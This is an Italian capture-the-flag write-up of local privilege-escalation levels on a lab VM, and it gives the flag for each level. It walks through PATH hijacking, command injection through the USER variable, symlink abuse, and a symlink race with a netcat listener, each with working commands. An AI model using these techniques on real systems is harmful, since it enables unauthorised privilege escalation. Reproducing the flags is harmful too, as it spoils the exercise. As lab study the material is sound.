**AC_1.01** 

1. Per montare il file iso: qemu-system-i386 -cdrom ccit_AC.iso -m 1024 -enable-kvm 

Dove: 
- -cdrom ccit_AC.iso --> monta l'ISO come fosse un CD di avvio
- -m 1024 --> 1 GB di RAM
- -enable-kvm --> usa l'accelerazione hardware (più veloce)
- uso qemu-system-i386 perché l'ISO è a 32 bit

Faccio invio e mi appre la prima flag 

2. CCIT{72318565-c76d-4ed9-81b6-afc582e75777}


**AC_1.02**

1. le credenizlai son level00:level00 
2. cerco il file eseguibile da flag00 --> find / -user flag00 -perm -4000 2>/dev/null
Dove: 
- user flag00: files owned by the target user
- perm /u+s: SUID bit set
- 2>/dev/null: drop the "Permission denied" noise
3. mi da una cartella che seguo --> /usr/share/nano/fishy 
3. mi stampa 1000 1001 1001 --> questi numeri sono RUID (level00=1000), EUID (flag00=1001) e GID. E' EUID a 1001 che stampa flag 
4. cat /home/flag00/flag.txt
5. CCIT{997874cf-581a-49ca-a449-51d24dd31fa5}

**AC_1.03**

1. fai exit finche non arrivi al login ed entri con level01:level01
2. vedi cosa c'è nel sorgente --> cat /home/flag01/flag01.c e vedi che ce una line di codice   "system("/usr/bin/env echo and now what?");" --> **PATH hijacking** 
3. Quando si scrive un comando (esempio echo ciao) il sistema va a cercare in una lista di cartelle dove sta il comando scelto per capire cosa deve fare --> PATH.
4. Se si va a fere Echo $PATH si vedrà qualcosa tipo /usr/local/bin:/usr/bin:/bin. Il nostro eseguibile fa esattamente questo: dice di cerca un progranma chiamato echo nel PATH e di eseguirlo. MA noi possimoa controllare ilPATH ---> path hijacking (faccio in mo-do che un programma esegue il mio comandoaa al posto del suo)
5. Faccio una serie di comandi 
```
cd 
echo '#!/bin/bash' > echo #creo un file di nome echo 
chmod +x echo # rendo eseguibile 
export PATH=/tmp:$PATH #metto il file in cima al PATH 
/home/flag01/falg01 #eseguo programma SetUIP (eseguire un prg com i privielgi del prorprietario al posto che dei miei)
/bin/cat /home/flag1/flag01 
```
6. CCIT{0fc0a412-4184-4c9d-af48-498f7bc713db}

**AC_1.04** 

1. faccio exit e rientro cono level02:level02
2. faccio ls -la /home/flag02 e vedo una serie di file --> cat /home/flag02/flag02.c 
3. ce un comando   asprintf(&buffer, "/bin/echo %s is cool", getenv("USER")); che prende la variabile di ambinete USER --> la cincolla dentro una stringa --> passa tutta la stringa e system() che la esegue come un comando bash 
3. Visto che ce il percorso assoluto /bin/bash hijacking non funziona sta volta, però possiamo modificare la variabile USER come vogliamo --> **command injection** 
4. Imposto la variabile USER con il comando per leggere un file export USER=';cat /home/flag02/flag.txt'
5. rilancio /home/flag02/flag02 e leggo flag 
6. CCIT{b5b43a28-962d-42ea-92b6-cefa552766a0}

**AC_1.05** 

1. facciamo exit e rientriamo con lvel03:level03 
2. si apre dentro una altra VM sembra dove si può scrivere su un file message.txt 
3. devo vedere il conentuo della home --> :e /home/flag03 
4. li ci sono dei file e con le frecce scrorro ffino a quelo desierato e premo invio
5. CCIT{c1cd2007-55bb-4a40-9f91-21f5e2207db1}

**AC_1.06** 

1. faccio exit e rientro con level04:level04 
2. il binario flag04 legge il file che gli passi come un argoemtno ma ccon i privilegi di flag04. Non si può leggere direttamente il file ma possono mettere un link simbolico e passargli quello 
3. cd /home/flag04 --> ln -s /home/flag04/flag.txt fintoFile --> /home/flag04/flag04 /home/level04/fintoFile
4. CCIT{4c886115-a6ca-4141-b0a2-69a25cadceaf}

**AC_1.07** 

Si basa su un bug che nasce quando un programma:
1. controlla una condizione su una risorsa (il "check")
2. e poi, un attimo dopo, usa quella risorsa (l'"use")

Il difetto è l'intervallo di tempo tra i due momenti: se in quel lasso riesco a cambiare ciò a cui la risorsa punta, il controllo viene fatto su una cosa ma l'uso avviene su un'altra

Nel proggramma flag05 faceva due azioni: 
1.  access(file, R_OK) -->  L'utente reale può leggere questo file?
2. opem(file) --> apre il file con i poteri fi flag05 

access() è pensato proprio per "controllare coi permessi dell'utente vero", ma poi open() apre con i permessi (più alti) del proprietario del binario. Separare il controllo dall'uso su un percorso (un nome di file) è l'errore: il nome link può puntare a cose diverse nei due istanti. 

Tra access() e open() il programma fa connect() + write() sulla rete --> operazioni "lente" --> la finestra temporale per lo scambio è larga, quindi la gara è più facile da vincere

L'idea: usare un symlink (collegamento simbolico) chiamato link e farlo "lampeggiare" rapidissimamente tra due bersagli:
- mio_file --> un file che io posso leggere (così access() dà OK)
- /home/flag05/flag.txt --> la flag (così open() la legge coi poteri di flag05)

```
cd 
echo ciao > mio_file        # creo fil esca che posso leggere 
while true; do nc -l -p 18211; done > out.txt 2>/dev/null &     # ricevemnte
while true; do ln -sf mio_file link; ln -sf /home/flag05/flag.txt link; done &      # loop che lampeggiare symlink 
while true; do /home/flag05/flag05 link 127.0.0.1 >/dev/null 2>&1; grep -q CCIT out.txt && break; done      # loop che segue bianrio finche vince 
grep CCIT out.txt      # leggo lfag 
```

while true; do nc -l -p 18211; done > out.txt 2>/dev/null &
- nc -l -p 18211 --> "netcat" si mette in ascolto (-l) sulla porta 18211, la stessa a cui il binario si connette.
- while true; do ... done --> lo rilancia all'infinito, perché ogni esecuzione di flag05 apre una nuova connessione.
- > out.txt --> tutto ciò che riceve viene scritto nel file out.txt.
- 2>/dev/null --> butta via i messaggi d'errore (output pulito).
- & --> lo manda in background, così il terminale resta libero.

while true; do ln -sf mio_file link; ln -sf /home/flag05/flag.txt link; done &
- ln -sf X link --> crea/aggiorna il collegamento link facendolo puntare a X.
  - -s = symbolic (collegamento simbolico), -f = force (sovrascrive quello esistente).
- Il ciclo sposta link avanti e indietro tra mio_file e la flag migliaia di volte al secondo.
- & --> anche questo in background.


while true; do /home/flag05/flag05 link 127.0.0.1 >/dev/null 2>&1; grep -q CCIT out.txt && break; done
- /home/flag05/flag05 link 127.0.0.1 --> esegue il binario passandogli due argomenti: il file (link) e l'host (127.0.0.1, cioè noi stessi).
- >/dev/null 2>&1 --> nasconde l'output del binario (a noi interessa solo out.txt).
- grep -q CCIT out.txt --> controlla silenziosamente (-q) se la flag è già arrivata nel file.
- && break --> se grep la trova, esci dal ciclo.
- Risultato: il loop martella il binario finché la race non viene vinta e la flag compare in out.txt.

CCIT{d276936f-92c2-4960-a0d8-afeac6c83d15}
